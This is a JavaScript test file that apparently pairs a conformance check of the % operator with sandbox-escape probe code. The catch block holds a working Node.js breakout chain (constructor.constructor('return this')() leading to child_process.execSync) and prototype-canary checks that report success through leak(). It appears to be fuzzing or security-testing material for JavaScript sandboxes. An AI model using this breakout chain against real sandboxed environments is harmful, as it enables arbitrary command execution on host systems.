try {
    if (1 % 2 !== 1) {
        $ERROR('#1: 1 % 2 === 1. Actual: ' + 1 % 2);
    }
    var x = 1;
    if (x % 2 !== 1) {
        $ERROR('#2: var x = 1; x % 2 === 1. Actual: ' + x % 2);
    }
    var y = 2;
    if (1 % y !== 1) {
        $ERROR('#3: var y = 2; 1 % y === 1. Actual: ' + 1 % y);
    }
    var x = 1;
    var y = 2;
    if (x % y !== 1) {
        $ERROR('#4: var x = 1; var y = 2; x % y === 1. Actual: ' + x % y);
    }
    var objectx = new Object();
    var objecty = new Object();
    objectx.prop = 1;
    objecty.prop = 2;
    if (objectx.prop % objecty.prop !== 1) {
        $ERROR('#5: var objectx = new Object(); var objecty = new Object(); objectx.prop = 1; objecty.prop = 2; objectx.prop % objecty.prop === 1. Actual: ' + objectx.prop % objecty.prop);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}